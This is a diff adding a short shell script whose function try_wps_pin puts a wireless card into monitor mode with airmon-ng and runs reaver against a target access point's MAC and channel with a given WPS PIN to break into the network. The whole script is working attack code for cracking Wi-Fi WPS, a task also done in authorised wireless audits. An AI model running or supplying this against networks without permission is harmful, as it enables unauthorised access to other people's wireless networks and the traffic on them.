@@ -1,0 +1,21 @@
+#!/bin/sh
+
+try_wps_pin(){
+    # 
+    # ESSID MAC CHANNEL ENC WPA WPA2 PIN
+    #set -ef
+    ESSID="$1"
+    MAC="$2"
+    CHANNEL="$3"
+    ENC="$4"
+    WPA="$5"
+    WPA2="$6"
+    PIN="$7"
+
+    [ "$ENC" == off ] && return 2
+
+    airmon-ng start ${WIFI:-wlan0}  $CHANNEL
+    sleep 1
+    reaver -i mon0 -b $MAC -vv -p "$PIN" -f -c $CHANNEL || :
+    airmon-ng stop mon0
+}
